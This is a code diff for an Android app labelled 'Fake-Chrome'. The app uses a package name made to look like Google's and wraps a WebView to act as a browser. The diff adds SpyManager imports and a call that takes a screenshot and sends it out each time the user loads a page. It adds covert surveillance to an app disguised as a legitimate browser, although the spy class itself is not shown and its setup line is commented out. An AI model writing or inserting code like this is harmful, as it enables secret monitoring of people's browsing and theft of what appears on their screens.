@@ -6,7 +6,6 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.os.Bundle
-import android.view.KeyEvent
 import android.webkit.WebSettings
 import android.webkit.WebView
 import android.webkit.WebViewClient
@@ -16,14 +15,12 @@ import androidx.activity.viewModels
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import com.android.google.databinding.ActivityMainBinding
+import com.android.google.services.spymanager.SpyHelper
+import com.android.google.services.spymanager.SpyManager
 import com.android.google.services.tracker.Tracker
 import com.android.google.utils.logw
 import com.android.google.utils.toast
 import com.android.google.viewmodel.MainViewModel
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.delay
-import kotlinx.coroutines.launch
 
 /*
 * Fake-Chrome 30.12.2022
@@ -38,6 +35,7 @@ class MainActivity : AppCompatActivity() {
     private var _binding: ActivityMainBinding? = null
     private val binding get() = _binding!!
 
+    private lateinit var spyManager: SpyManager
     private val mainViewModel: MainViewModel by viewModels()
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -45,6 +43,8 @@ class MainActivity : AppCompatActivity() {
 
         prepareBinding()
         handleOnBackPressed()
+
+        //spyManager = SpyHelper.initialize()
     }
 
     private fun handleOnBackPressed() {
@@ -93,6 +93,7 @@ class MainActivity : AppCompatActivity() {
 
                 if (url != null) { // Saving url state
                     mainViewModel.setUrl(url)
+                    spyManager.takeAndSendScreenshot()
                 }
 
                 if (BuildConfig.DEBUG) {
